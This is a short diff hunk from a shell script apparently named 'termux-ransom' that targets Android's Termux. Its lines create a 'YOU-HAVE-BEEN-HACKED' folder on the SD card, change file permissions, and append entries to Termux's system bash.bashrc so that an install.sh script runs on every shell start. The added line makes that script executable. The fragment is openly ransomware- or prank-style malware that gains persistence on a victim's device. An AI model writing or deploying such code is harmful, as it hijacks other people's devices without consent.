@@ -6,6 +6,7 @@ $chmod u=w /$HOME/.rfkzk
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
 chmod u=x *
 chmod u=rwx 1705743575411.png
+chmod u=rx install.sh
 clear
 echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
